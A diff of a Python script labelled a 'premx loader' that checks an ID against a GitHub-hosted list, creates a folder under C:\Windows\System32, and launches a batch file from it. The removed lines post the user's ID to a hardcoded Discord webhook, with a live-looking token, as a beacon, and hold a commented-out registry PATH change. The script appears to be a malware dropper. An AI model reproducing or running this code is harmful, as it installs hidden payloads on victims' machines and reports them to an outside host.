@@ -13,16 +13,6 @@ import gdown
 result = check_string_in_url("https://raw.githubusercontent.com/casikiouxklxz34/myins/refs/heads/main/unique_id.txt", file_contentsx1)
 os.system('cls')
 
-resultpyver = subprocess.run(["py", "--version"], capture_output=True, text=True)
-versionpyx = resultpyver.stdout.strip() or resultpyver.stderr.strip()
-if versionpyx != "Python 3.11.5":
-    requests.post("https://discord.com/api/webhooks/1351062265151098952/VzMBHhnEsr96ymePMDow-TATaTWdhVO9HUqmWNmCtuiX8oo6O0mMJQ6mz-cVfZSwh62_", json={"content": file_contentsx1 + " executed premx loader but python is not installed."})
-    os.system('cls')
-    print("---------------------------")
-    print("Error. Python is not installed on your system.")
-    input()
-    exit()
-
 dcnmwxdr = r'C:\Windows\System32\DSEL'
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
@@ -112,31 +102,6 @@ def run_batch_file(batch_file_path):
 os.system('cls')
 batch_file_path = r"C:\Windows\System32\DSEL\klx2025.bat"
 os.system('cls')
-
-
-
-'''
-import winreg
-def update_user_path():
-    username = os.getenv('USERNAME')
-    full_path_to_add = os.path.join('C:\\Users', username, 'AppData\\Local\\Programs\\Python\\Python311\\Scripts')
-
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_READ)
-    current_path_value, _ = winreg.QueryValueEx(key, 'Path')
-    winreg.CloseKey(key)
-
-    if full_path_to_add not in current_path_value.split(';'):
-        new_path_value = f"{current_path_value};{full_path_to_add}"
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(key, 'Path', 0, winreg.REG_EXPAND_SZ, new_path_value)
-        winreg.CloseKey(key)
-
-flag_pathx = r'C:\Windows\System32\pathlibx.txt'
-if not os.path.exists(flag_pathx):
-    update_user_path()
-    with open(flag_path, 'w') as f:
-        f.write('Path update completed.\n')
-'''
 
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
